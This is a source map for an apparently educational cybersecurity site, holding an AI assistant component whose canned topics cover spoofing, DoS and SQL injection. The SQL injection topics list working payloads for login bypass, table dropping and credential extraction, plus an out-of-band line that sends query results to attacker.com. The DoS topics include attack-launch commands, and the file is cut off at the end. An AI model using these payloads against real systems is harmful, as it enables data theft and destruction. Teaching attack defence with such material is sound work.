{"version":3,"file":"AttackPagesHeader-DyV9K30K.js","sources":["../../src/components/AIAssistant/assistantData.js","../../src/components/AIAssistant/AIAssistant.jsx","../../src/components/AttackPagesHeader/AttackPagesHeader.jsx"],"sourcesContent":["const assistantData = {\r\n  spoofing: {\r\n    topics: {\r\n      \"What is Spoofing?\": {\r\n        content: \"Spoofing is a type of cyber attack where an attacker disguises themselves as a trusted source to gain unauthorized access, steal data, or spread malware. The attacker falsifies data to hide their true identity and pretends to be a legitimate entity or device to deceive systems and users.\"\r\n      },\r\n      \"DNS Spoofing Commands\": {\r\n        content: `Here are the key DNS Spoofing commands and their explanations:\r\n\r\n1. Detection Phase:\r\n\\`\\`\\`\r\ncd ~/dns_spoofing\r\npython3 dnspt1.py\r\ncat /etc/resolv.conf\r\nnslookup cyberhub.com\r\n\\`\\`\\`\r\n• dnspt1.py: Performs comprehensive DNS spoofing checks\r\n• cat /etc/resolv.conf: Displays DNS resolver configuration\r\n• nslookup: Tests domain resolution to detect hijacking\r\n\r\n2. Analysis Phase:\r\n\\`\\`\\`\r\npython3 dnspt2.py\r\ndig @8.8.8.8 cyberhub.com\r\ngrep cyberhub.com /etc/hosts\r\n\\`\\`\\`\r\n• dnspt2.py: Runs deeper analysis\r\n• dig: Queries trusted DNS server to verify resolution\r\n• grep: Checks for malicious host file entries\r\n\r\n3. Remediation Phase:\r\n\\`\\`\\`\r\npython3 dnspt3.py\r\nsudo sed -i '/cyberhub.com/d' /etc/hosts\r\ngrep 'cyberhub.com' /etc/hosts\r\necho '172.67.182.31 cyberhub.com' | sudo tee -a /etc/hosts\r\nsudo systemd-resolve --flush-caches\r\nnslookup cyberhub.com\r\ncurl -Is https://cyberhub.com | head -n 1\r\n\\`\\`\\`\r\n• dnspt3.py: Guides through fixing DNS spoofing\r\n• sed: Removes malicious entries\r\n• tee: Adds correct IP mapping\r\n• systemd-resolve: Clears DNS cache\r\n• curl: Tests HTTPS connection`\r\n      },\r\n      \"IP Spoofing Commands\": {\r\n        content: `Here are the key IP Spoofing commands and their explanations:\r\n\r\n1. Basic IP Spoofing:\r\n\\`\\`\\`\r\npython3 ipspoofpt1.py\r\nip a\r\nip route\r\nping -c 3 192.168.1.100\r\narp -a\r\n\\`\\`\\`\r\n• ipspoofpt1.py: Creates and sends packets with forged source IP\r\n• ip a: Shows network interface information\r\n• ip route: Displays routing table\r\n• ping: Tests connectivity\r\n• arp -a: Shows IP-to-MAC address mappings\r\n\r\n2. Advanced IP Spoofing:\r\n\\`\\`\\`\r\npython3 ipspoofpt2.py\r\nsudo tcpdump -i eth0 -n 'arp' -c 5\r\nsudo arp -d 192.168.1.1\r\nsudo arp -s 192.168.1.1 00:1a:2b:3c:4d:5e\r\n\\`\\`\\`\r\n• ipspoofpt2.py: Performs IP flooding with multiple spoofed addresses\r\n• tcpdump: Monitors ARP traffic\r\n• arp -d: Deletes ARP entry\r\n• arp -s: Adds static ARP entry`\r\n      }\r\n    }\r\n  },\r\n  dos: {\r\n    topics: {\r\n      \"What is DoS/DDoS?\": {\r\n        content: `A Denial of Service (DoS) attack aims to make a service, network, or system unavailable to its intended users by overwhelming it with traffic or requests. There are several types:\r\n\r\n1. DoS Attack: Single source overwhelming a target\r\n2. DDoS Attack: Multiple sources (botnets) attacking simultaneously\r\n3. Slowloris Attack: Keeps many HTTP connections open indefinitely\r\n\r\nThese attacks can cause service disruption, financial losses, and reputational damage.`\r\n      },\r\n      \"Basic DoS Attack Commands\": {\r\n        content: `Here are the commands for executing and mitigating a basic DoS attack:\r\n\r\n1. Launch Attack:\r\n\\`\\`\\`\r\nsudo python3 launch_dos.py\r\n\\`\\`\\`\r\n• sudo: Runs with superuser privileges\r\n• python3: Invokes Python interpreter\r\n• launch_dos.py: Script that initiates DoS attack\r\n\r\n2. Stop Attack:\r\n\\`\\`\\`\r\nsudo iptables -A INPUT -s 127.0.0.3 -j DROP\r\n\\`\\`\\`\r\n• iptables: Linux firewall utility\r\n• -A INPUT: Appends rule to INPUT chain\r\n• -s 127.0.0.3: Specifies source IP\r\n• -j DROP: Drops matching packets`\r\n      },\r\n      \"DDoS Attack Commands\": {\r\n        content: `Here are the commands for executing and mitigating a DDoS attack:\r\n\r\n1. Launch Attack:\r\n\\`\\`\\`\r\nsudo python3 ddos.py\r\n\\`\\`\\`\r\n• sudo: Runs with superuser privileges\r\n• python3: Invokes Python interpreter\r\n• ddos.py: Script that coordinates multiple attack sources\r\n\r\n2. Stop Attack:\r\n\\`\\`\\`\r\nsudo iptables -A INPUT -s 127.0.0.0/24 -j DROP\r\n\\`\\`\\`\r\n• iptables: Linux firewall utility\r\n• -A INPUT: Appends rule to INPUT chain\r\n• -s 127.0.0.0/24: Blocks entire IP range\r\n• -j DROP: Drops matching packets\r\n\r\nKey difference from DoS: DDoS uses multiple source IPs (botnets) for the attack.`\r\n      },\r\n      \"Slowloris Attack Commands\": {\r\n        content: `Here are the commands for executing and mitigating a Slowloris attack:\r\n\r\n1. Launch Attack:\r\n\\`\\`\\`\r\nsudo python3 launch_slowloris.py\r\n\\`\\`\\`\r\n• sudo: Runs with superuser privileges\r\n• python3: Invokes Python interpreter\r\n• launch_slowloris.py: Script that keeps connections open indefinitely\r\n\r\n2. Stop Attack:\r\n\\`\\`\\`\r\nsudo iptables -A INPUT -p tcp --syn --dport 4000 -m connlimit --connlimit-above 20 -j DROP\r\n\\`\\`\\`\r\n• -p tcp --syn: Matches new TCP connections\r\n• --dport 4000: Targets specific port\r\n• -m connlimit --connlimit-above 20: Limits connections per IP\r\n• -j DROP: Drops excess connections\r\n\r\nSlowloris is unique because it uses minimal bandwidth but exhausts server resources by keeping connections open.`\r\n      },\r\n      \"HTTP Flood Attack\": {\r\n        content: `Here are the commands for executing and mitigating an HTTP Flood attack:\r\n\r\n1. Launch Attack:\r\n\\`\\`\\`\r\nsudo python3 http_flood.py\r\n\\`\\`\\`\r\n• sudo: Runs with superuser privileges\r\n• python3: Invokes Python interpreter\r\n• http_flood.py: Script that sends massive HTTP requests\r\n\r\n2. Stop Attack:\r\n\\`\\`\\`\r\nsudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT\r\n\\`\\`\\`\r\n• -p tcp --dport 80: Targets HTTP port\r\n• -m limit: Uses limit module\r\n• --limit 25/minute: Allows 25 new connections per minute\r\n• --limit-burst 100: Allows burst of 100 connections\r\n• -j ACCEPT: Accepts packets matching these criteria\r\n\r\nHTTP Flood attacks target web servers by overwhelming them with valid HTTP requests.`\r\n      },\r\n      \"Common DoS/DDoS Attacks\": {\r\n        content: `Overview of common DoS/DDoS attack types:\r\n\r\n1. Volume Based Attacks:\r\n• UDP Flood: Sends large UDP packets\r\n• ICMP Flood: Overwhelms with ping requests\r\n• DNS Amplification: Uses DNS servers to amplify traffic\r\n\r\n2. Protocol Attacks:\r\n• SYN Flood: Exploits TCP handshake\r\n• Ping of Death: Sends malformed ping packets\r\n• Smurf Attack: Uses broadcast addresses\r\n\r\n3. Application Layer Attacks:\r\n• HTTP Flood: Overwhelms web servers\r\n• Slowloris: Keeps connections open\r\n• Zero-day DDoS: Exploits unknown vulnerabilities\r\n\r\n4. Multi-Vector Attacks:\r\n• Combines multiple attack types\r\n• Harder to detect and mitigate\r\n• Requires comprehensive defense`\r\n      },\r\n      \"Defense Strategies\": {\r\n        content: `Key strategies to protect against DoS/DDoS attacks:\r\n\r\n1. Traffic Analysis:\r\n• Monitor network traffic patterns\r\n• Set up intrusion detection systems\r\n• Analyze logs for anomalies\r\n\r\n2. Rate Limiting:\r\n• Implement request rate limits\r\n• Set connection timeouts\r\n• Use connection limiting per IP\r\n\r\n3. Firewall Rules:\r\n• Configure iptables properly\r\n• Block suspicious IP ranges\r\n• Filter malicious traffic\r\n\r\n4. Server Configuration:\r\n• Increase resource limits\r\n• Configure timeout settings\r\n• Implement reverse proxy\r\n\r\n5. DDoS Mitigation Services:\r\n• Use cloud-based protection\r\n• Implement load balancing\r\n• Deploy traffic scrubbing`\r\n      }\r\n    }\r\n  },\r\n  sql: {\r\n    topics: {\r\n      \"What is SQL Injection?\": {\r\n        content: `SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Common types include:\r\n\r\n1. Classic SQL Injection:\r\n• Directly visible results\r\n• Error messages provide feedback\r\n• Immediate impact on query execution\r\n\r\n2. Blind SQL Injection:\r\n• No visible feedback\r\n• Uses boolean conditions\r\n• Time-based techniques\r\n\r\n3. Union-Based SQL Injection:\r\n• Combines results with legitimate query\r\n• Requires matching column numbers\r\n• Extracts data from other tables\r\n\r\nThese vulnerabilities can lead to unauthorized data access, modification, or deletion.`\r\n      },\r\n      \"Classic SQL Injection\": {\r\n        content: `Classic SQL injection techniques and examples:\r\n\r\n1. Basic Injection:\r\n\\`\\`\\`\r\n' OR '1'='1\r\nadmin' --\r\n' OR 1=1; --\r\n\\`\\`\\`\r\n• Bypasses login forms\r\n• Shows all records\r\n• Comments out remaining query\r\n\r\n2. Error-Based:\r\n\\`\\`\\`\r\n' AND 1=CONVERT(int, @@version) --\r\n' AND 1=db_name() --\r\n\\`\\`\\`\r\n• Forces database errors\r\n• Extracts information from error messages\r\n\r\n3. Stacked Queries:\r\n\\`\\`\\`\r\n'; DROP TABLE users --\r\n'; INSERT INTO admin VALUES ('hacker','pass') --\r\n\\`\\`\\`\r\n• Executes multiple queries\r\n• Can modify database structure`\r\n      },\r\n      \"Blind SQL Injection\": {\r\n        content: `Techniques for blind SQL injection:\r\n\r\n1. Boolean-Based:\r\n\\`\\`\\`\r\n' AND 1=1 --    (true condition)\r\n' AND 1=2 --    (false condition)\r\n' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM users),1,1))=65 --\r\n\\`\\`\\`\r\n• Uses true/false responses\r\n• Extracts data one character at time\r\n• Requires many requests\r\n\r\n2. Time-Based:\r\n\\`\\`\\`\r\n'; IF 1=1 WAITFOR DELAY '0:0:5' --\r\n'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5' --\r\n\\`\\`\\`\r\n• Uses time delays to infer results\r\n• Works when no visible feedback\r\n• Slower but reliable\r\n\r\n3. Out-of-Band:\r\n\\`\\`\\`\r\n'; DECLARE @q VARCHAR(1024);SET @q=CONCAT('\\\\\\\\',(<query>),'.attacker.com\\\\a.txt');EXEC master..xp_dirtree @q--\r\n\\`\\`\\`\r\n• Extracts data via DNS/HTTP\r\n• Bypasses network restrictions\r\n• Useful for data exfiltration`\r\n      },\r\n      \"Union-Based Injection\": {\r\n        content: `UNION-based SQL injection techniques:\r\n\r\n1. Column Number Discovery:\r\n\\`\\`\\`\r\n' ORDER BY 1--    (increment until error)\r\n' UNION SELECT NULL--\r\n' UNION SELECT NULL,NULL--\r\n\\`\\`\\`\r\n• Determines number of columns\r\n• Matches column count with original query\r\n• Required for successful UNION\r\n\r\n2. Data Extraction:\r\n\\`\\`\\`\r\n' UNION SELECT username,password FROM users--\r\n' UNION SELECT NULL,@@version--\r\n' UNION SELECT table_name,NULL FROM information_schema.tables--\r\n\\`\\`\\`\r\n• Combines results with legitimate query\r\n• Extracts data from other tables\r\n• Can retrieve schema information\r\n\r\n3. Advanced Techniques:\r\n\\`\\`\\`\r\n' UNION SELECT CONCAT(username,':',password),NULL FROM users--\r\n' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables--\r\n\\`\\`\\`\r\n• Combines multiple columns\r\n• Extracts bulk data\r\n• Optimizes number of requests`\r\n      },\r\n      \"Prevention Methods\": {\r\n        content: `Key methods to prevent SQL injection:\r\n\r\n1. Parameterized Queries:\r\n\\`\\`\\`\r\n// Instead of:\r\n\"SELECT * FROM users WHERE username='\" + username + \"'\"\r\n\r\n// Use:\r\n\"SELECT * FROM users WHERE username=?\"\r\n\\`\\`\\`\r\n• Use prepared statements\r\n• Never concatenate user input\r\n\r\n2. Input Validation:\r\n• Whitelist allowed characters\r\n• Validate data type and length\r\n• Escape special characters\r\n\r\n3. Least Privilege:\r\n• Use restricted database accounts\r\n• Limit database permissions\r\n• Separate accounts for different operations\r\n\r\n4. WAF Configuration:\r\n• Enable SQL injection rules\r\n• Monitor and log suspicious queries\r\n• Block known attack patterns`\r\n      }\r\n    }\r\n  }\r\n};\r\n\r\nexport default assistantData;\r\n","import React, { useState, useRef, useEffect } from 'react';\r\nimport './AIAssistant.css';\r\nimport assistantData from './assistantData';\r\nimport { getOllamaResponse } from '../../utils/ollamaUtils';\r\n\r\nconst AIAssistant = ({ pageType, isOpen, onClose }) => {\r\n  const [messages, setMessages] = useState([]);\r\n  const [inputText, setInputText] = useState('');\r\n  const [isProcessing, setIsProcessing] = useState(false);\r\n  const [isExpanded, setIsExpanded] = useState(false);\r\n  const messagesEndRef = useRef(null);\r\n  const responseTimeoutRef = useRef(null);\r\n\r\n  const scrollToBottom = () => {\r\n    messagesEndRef.current?.scrollIntoView({ behavior: \"smooth\" });\r\n  };\r\n\r\n  useEffect(() => {\r\n    scrollToBottom();\r\n  }, [messages]);\r\n\r\n  useEffect(() => {\r\n    if (isOpen && pageType) {\r\n      const topics = assistantData[pageType]?.topics || {};\r\n      const topicTitles = Object.keys(topics);\r\n      \r\n      setMessages([{\r\n        type: 'assistant',\r\n        text: `Welcome! I'm your AI assistant for ${pageType.toUpperCase()}. Choose a topic:`,\r\n        topics: topicTitles.map(title => ({\r\n          title,\r\n          content: topics[title]?.content\r\n        }))\r\n      }]);\r\n    }\r\n  }, [isOpen, pageType]);\r\n\r\n  // Cleanup timeout on unmount\r\n  useEffect(() => {\r\n    return () => {\r\n      if (responseTimeoutRef.current) {\r\n        clearTimeout(responseTimeoutRef.current);\r\n      }\r\n    };\r\n  }, []);\r\n\r\n  const formatContent = (content) => {\r\n    if (content.includes('```')) {\r\n      return content.split('```').map((part, index) => {\r\n        if (index % 2 === 1) {\r\n          return (\r\n            <pre key={index} className=\"code-block\">\r\n              <code>{part.trim()}</code>\r\n            </pre>\r\n          );\r\n        }\r\n        return <p key={index}>{part.split('\\n').map((line, i) => (\r\n          <React.Fragment key={i}>\r\n            {line}\r\n            <br />\r\n          </React.Fragment>\r\n        ))}</p>;\r\n      });\r\n    }\r\n    return content.split('\\n').map((line, i) => (\r\n      <React.Fragment key={i}>\r\n        {line}\r\n        <br />\r\n      </React.Fragment>\r\n    ));\r\n  };\r\n\r\n  const handleTopicClick = (topic) => {\r\n    const topicData = assistantData[pageType]?.topics[topic.title];\r\n    if (topicData) {\r\n      setMessages(prevMessages => [...prevMessages, \r\n        {\r\n          type: 'user',\r\n          text: `Tell me about ${topic.title}`\r\n        },\r\n        {\r\n          type: 'assistant',\r\n          text: topicData.content,\r\n          isFormatted: true\r\n        }\r\n      ]);\r\n    }\r\n  };\r\n\r\n  const handleSendMessage = async (e) => {\r\n    e?.preventDefault();\r\n    if (!inputText.trim() || isProcessing) return;\r\n\r\n    const userMessage = {\r\n      type: 'user',\r\n      text: inputText.trim()\r\n    };\r\n\r\n    setMessages(prevMessages => [...prevMessages, userMessage]);\r\n    setInputText('');\r\n    setIsProcessing(true);\r\n\r\n    try {\r\n      // First check if there's a predefined topic that matches\r\n      const topics = assistantData[pageType]?.topics || {};\r\n      const matchingTopic = Object.entries(topics).find(([title]) => \r\n        title.toLowerCase().includes(userMessage.text.toLowerCase()) ||\r\n        userMessage.text.toLowerCase().includes(title.toLowerCase())\r\n      );\r\n\r\n      if (matchingTopic) {\r\n        setMessages(prevMessages => [...prevMessages, {\r\n          type: 'assistant',\r\n          text: matchingTopic[1].content,\r\n          isFormatted: true\r\n        }]);\r\n        setIsProcessing(false);\r\n        return;\r\n      }\r\n\r\n      // Set timeout for response\r\n      const timeoutPromise = new Promise((_, reject) => {\r\n        responseTimeoutRef.current = setTimeout(() => {\r\n          reject(new Error('Response took too long. Please try again.'));\r\n        }, 20000); // 10 second timeout\r\n      });\r\n\r\n      // Create a concise prompt\r\n      const prompt = `Context: ${pageType} cybersecurity.\r\nQ: ${userMessage.text}\r\nGive a brief, focused answer about ${pageType}.`;\r\n\r\n      // Race between the response and timeout\r\n      const response = await Promise.race([\r\n        getOllamaResponse(prompt),\r\n        timeoutPromise\r\n      ]);\r\n\r\n      clearTimeout(responseTimeoutRef.current);\r\n\r\n      if (!response) {\r\n        throw new Error('No response received');\r\n      }\r\n\r\n      setMessages(prevMessages => [...prevMessages, {\r\n        type: 'assistant',\r\n        text: response\r\n      }]);\r\n    } catch (error) {\r\n      console.error('Error in handleSendMessage:', error);\r\n      setMessages(prevMessages => [...prevMessages, {\r\n        type: 'assistant',\r\n        text: error.message || 'I apologize, but I encountered an error. Please try again.'\r\n      }]);\r\n    } finally {\r\n      setIsProcessing(false);\r\n    }\r\n  };\r\n\r\n  const handleKeyPress = (e) => {\r\n    if (e.key === 'Enter' && !e.shiftKey) {\r\n      e.preventDefault();\r\n      handleSendMessage();\r\n    }\r\n  };\r\n\r\n  const toggleExpand = () => {\r\n    setIsExpanded(!isExpanded);\r\n  };\r\n\r\n  const clearMessages = () => {\r\n    const topics = assistantData[pageType]?.topics || {};\r\n    const topicTitles = Object.keys(topics);\r\n    \r\n    setMessages([{\r\n      type: 'assistant',\r\n      text: `Welcome! I'm your AI assistant for ${pageType ? pageType.toUpperCase() : ''}. Choose a topic:`,\r\n      topics: topicTitles.map(title => ({\r\n        title,\r\n        content: topics[title]?.content\r\n      }))\r\n    }]);\r\n  };\r\n\r\n  if (!isOpen) return null;\r\n\r\n  return (\r\n    <div className=\"ai-assistant-container\" onClick={(e) => {\r\n      if (e.target === e.currentTarget) onClose();\r\n    }}>\r\n      <div className={`ai-assistant-window ${isExpanded ? 'expanded' : ''}`}>\r\n        <div className=\"ai-assistant-header\">\r\n          <div className=\"header-left\">\r\n            <span role=\"img\" aria-label=\"AI\" className=\"ai-icon\">✨</span>\r\n            <h3>AI Learning Assistant</h3>\r\n          </div>\r\n          <div className=\"header-right\">\r\n            <button className=\"header-icon-button\" onClick={clearMessages} aria-label=\"Clear\">\r\n              <span role=\"img\">🗑️</span>\r\n            </button>\r\n            <button className=\"header-icon-button\" onClick={toggleExpand} aria-label=\"Expand\">\r\n              <span>{isExpanded ? '⤢' : '⤡'}</span>\r\n            </button>\r\n            <button className=\"header-icon-button\" onClick={onClose} aria-label=\"Close\">\r\n              <span>×</span>\r\n            </button>\r\n          </div>\r\n        </div>\r\n        \r\n        <div className=\"ai-assistant-body\">\r\n          <div className=\"ai-chat-messages\">\r\n            {messages.map((message, index) => (\r\n              <div key={index} className={`ai-message ${message.type === 'user' ? 'ai-user-message' : 'ai-assistant-message'}`}>\r\n                {message.isFormatted ? formatContent(message.text) : message.text}\r\n                {message.topics && (\r\n                  <div className=\"ai-topics\">\r\n                    {message.topics.map((topic, topicIndex) => (\r\n                      <button\r\n                        key={topicIndex}\r\n                        className=\"ai-topic-button\"\r\n                        onClick={() => handleTopicClick(topic)}\r\n                      >\r\n                        {topic.title}\r\n                      </button>\r\n                    ))}\r\n                  </div>\r\n                )}\r\n              </div>\r\n            ))}\r\n            {isProcessing && (\r\n              <div className=\"ai-message ai-assistant-message\">\r\n                <div className=\"typing-indicator\">Thinking...</div>\r\n              </div>\r\n            )}\r\n            <div ref={messagesEndRef} />\r\n          </div>\r\n        </div>\r\n        \r\n        <div className=\"ai-chat-input\">\r\n          <input\r\n            type=\"text\"\r\n            value={inputText}\r\n            onChange={(e) => setInputText(e.target.value)}\r\n            onKeyPress={handleKeyPress}\r\n            placeholder={isProcessing ? \"Please wait...\" : \"Ask me anything about this topic\"}\r\n            disabled={isProcessing}\r\n          />\r\n          <button \r\n            onClick={handleSendMessage} \r\n            className=\"send-button\" \r\n            aria-label=\"Send\"\r\n            disabled={isProcessing || !inputText.trim()}\r\n          >\r\n            <span>{isProcessing ? '...' : '➤'}</span>\r\n          </button>\r\n        </div>\r\n      </div>\r\n    </div>\r\n  );\r\n};\r\n\r\nexport default AIAssistant;\r\n","import React, { useState } from 'react';\r\nimport { Link } from 'react-router-dom';\r\nimport AIAssistant from '../AIAssistant/AIAssistant';\r\nimport GoogleTranslateLanguageSelector from '../GoogleTranslateLanguageSelector';\r\n\r\nconst AttackPagesHeader = ({ pageType }) => {\r\n  const [showAssistant, setShowAssistant] = useState(false);\r\n\r\n  return (\r\n    <>\r\n      <div style={{\r\n        position: 'sticky',\r\n        top: 0,\r\n        zIndex: 100,\r\n        width: '100%',\r\n        backgroundColor: '#000000',\r\n        borderBottom: '1px solid #2d3748',\r\n        display: 'flex',\r\n        justifyContent: 'space-between',\r\n        alignItems: 'center',\r\n        height: '64px',\r\n        padding: '0 24px'\r\n      }}>\r\n        {/* Left side */}\r\n        <div style={{\r\n          display: 'flex',\r\n          alignItems: 'center',\r\n          gap: '24px'\r\n        }}>\r\n          <Link \r\n            to=\"/\"\r\n            style={{\r\n              color: '#fff',\r\n              textDecoration: 'none',\r\n              fontSize: '24px',\r\n              fontWeight: 'bold'\r\n            }}\r\n          >\r\n            C_\r\n          </Link>\r\n        </div>\r\n\r\n        {/* Center - AI Assistant Button */}\r\n        <button\r\n          onClick={() => setShowAssistant(!showAssistant)}\r\n          style={{\r\n            position: 'absolute',\r\n            left: '50%',\r\n            transform: 'translateX(-50%)',\r\n            backgroundColor: '#0c1221',\r\n            border: '1px solid #2d3748',\r\n            borderRadius: '6px',\r\n            color: '#fff',\r\n            padding: '8px 16px',\r\n            display: 'flex',\r\n            alignItems: 'center',\r\n            gap: '8px',\r\n            cursor: 'pointer',\r\n            fontSize: '14px',\r\n            transition: 'all 0.2s',\r\n            width: 'auto',\r\n            minWidth: '250px',\r\n            justifyContent: 'center'\r\n          }}\r\n          onMouseEnter={(e) => e.target.style.backgroundColor = '#1e293b'}\r\n          onMouseLeave={(e) => e.target.style.backgroundColor = '#0c1221'}\r\n        >\r\n          <span role=\"img\" aria-label=\"AI\" style={{ fontSize: '16px' }}>✨</span>\r\n          Ask the AI Learning Assistant\r\n        </button>\r\n\r\n        {/* Right side */}\r\n        <div style={{\r\n          display: 'flex',\r\n          alignItems: 'center',\r\n          gap: '24px'\r\n        }}>\r\n          <GoogleTranslateLanguageSelector />\r\n          <button style={{\r\n            backgroundColor: 'transparent',\r\n            border: 'none',\r\n            color: '#fff',\r\n            cursor: 'pointer',\r\n            fontSize: '14px'\r\n          }}>\r\n            Tools\r\n          </button>\r\n          <Link \r\n            to=\"/profile\"\r\n            style={{\r\n              width: '32px',\r\n              height: '32px',\r\n              borderRadius: '50%',\r\n              backgroundColor: '#30363D',\r\n              display: 'flex',\r\n              alignItems: 'center',\r\n              justifyContent: 'center',\r\n              textDecoration: 'none'\r\n            }}\r\n          >\r\n            👤\r\n          </Link>\r\n        </div>\r\n      </div>\r\n      \r\n      {/* AI Assistant Component */}\r\n      <AIAssistant \r\n        pageType={pageType} \r\n        isOpen={showAssistant} \r\n        onClose={() => setShowAssistant(false)} \r\n      />\r\n    </>\r\n  );\r\n};\r\n\r\nexport default AttackPagesHeader;\r\n"],"names":["assistantData","spoofing","topics","content","dos","sql","AIAssistant","pageType","isOpen","onClose","messages","setMessages","useState","inputText","setInputText","isProcessing","setIsProcessing","isExpanded","setIsExpanded","messagesEndRef","useRef","responseTimeoutRef","scrollToBottom","current","scrollIntoView","behavior","useEffect","topicTitles","Object","keys","type","text","toUpperCase","map","title","clearTimeout","formatContent","includes","split","part","index","jsx","className","children","trim","line","i","jsxs","React","Fragment","handleTopicClick","topic","topicData","prevMessages","isFormatted","handleSendMessage","e","preventDefault","userMessage","matchingTopic","entries","find","toLowerCase","timeoutPromise","Promise","_","reject","setTimeout","Error","prompt","response","race","getOllamaResponse","error","console","message","handleKeyPress","key","shiftKey","toggleExpand","clearMessages","onClick","target","currentTarget","role","topicIndex","ref","value","onChange","onKeyPress","placeholder","disabled","AttackPagesHeader","showAssistant","setShowAssistant","style","position","top","zIndex","width","backgroundColor","borderBottom","display","justifyContent","alignItems","height","padding","gap","Link","to","color","textDecoration","fontSize","fontWeight","left","transform","border","borderRadius","cursor","transition","minWidth","onMouseEnter","onMouseLeave","GoogleTranslateLanguageSelector"],"mappings":"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